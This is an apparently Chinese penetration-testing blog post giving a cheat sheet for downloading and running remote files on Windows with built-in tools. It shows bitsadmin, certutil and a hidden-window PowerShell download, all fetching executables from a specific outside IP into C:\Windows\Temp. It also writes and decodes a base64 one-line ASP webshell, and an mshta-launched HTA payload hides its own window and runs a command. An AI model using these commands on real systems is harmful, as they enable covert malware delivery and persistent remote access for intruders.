+++
date = "2018-02-06T15:12:32+08:00"
description = "在windows的终端下下载文件，在windows的终端下执行远程文件"
draft = false
tags = ["intranet"]
title = "Windows终端下载文件和执行远程文件"
topics = ["Pentest"]

+++

### 0x00 bitsadmin下载文件
win2008
```bash
bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe
bitsadmin /rawreturn /transfer getpayload 114.115.214.203/a.zip C:\Windows\Temp\a.zip
bitsadmin /transfer myDownLoadJob /download /priority normal "http://114.115.214.203/a.exe" "C:\Windows\Temp\a.exe"
```

### 0x01 powershell下载文件
win2008
```bash
powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")

#-w hidden 下载后终端自动退出
powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://114.115.214.203/a.exe","C:\Windows\Temp\a.exe")
```

### 0x02 certutil下载文件
```bash
certutil -urlcache -split -f http://114.115.214.203/test.txt test.txt

certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe

#写文件的方法：
mshta vbscript:createobject("scripting.filesystemobject").createtextfile("test11.txt",2,ture).writeline("PCVleGVjdXRlKHJlcXVlc3QoImwiKSklPg==")(window.close)
certutil -decode test11.txt mu.asp #一句话马
type mu.asp
```

### 0x03 mshta执行远程hta
```
mshta http://114.115.214.203/payload.hta
```
payload.hta
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script language="VBScript">
        Window.ReSizeTo 0, 0
        Window.moveTo -2000,-2000
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
        self.close
    </script>
</head>
<body>

demo

</body>
</html>
```

未完待续。。。